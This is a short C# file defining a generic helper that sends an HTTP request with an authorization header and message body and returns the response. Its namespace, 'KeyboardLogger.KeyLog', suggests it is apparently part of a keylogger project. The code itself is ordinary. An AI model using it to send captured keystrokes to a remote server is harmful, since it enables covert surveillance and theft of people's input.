using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;



namespace KeyboardLogger.KeyLog
{
    class Http
    {
        // Request (url, method, contentType, msg)
        // - perform a http request to given url and get a response
        public static string Request(string url, string method, string contentType, string auth, string msg)
        {
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            ASCIIEncoding encd = new ASCIIEncoding();
            byte[] data = encd.GetBytes(msg);
            req.Method = method;
            req.ContentType = contentType;
            req.ContentLength = data.Length;
            req.Headers.Add("Authorization", auth);
            using (Stream reqStrm = req.GetRequestStream()) { reqStrm.Write(data, 0, data.Length); }
            HttpWebResponse res = (HttpWebResponse)req.GetResponse();
            string resStr = new StreamReader(res.GetResponseStream()).ReadToEnd();
            return resStr;
        }
    }
}
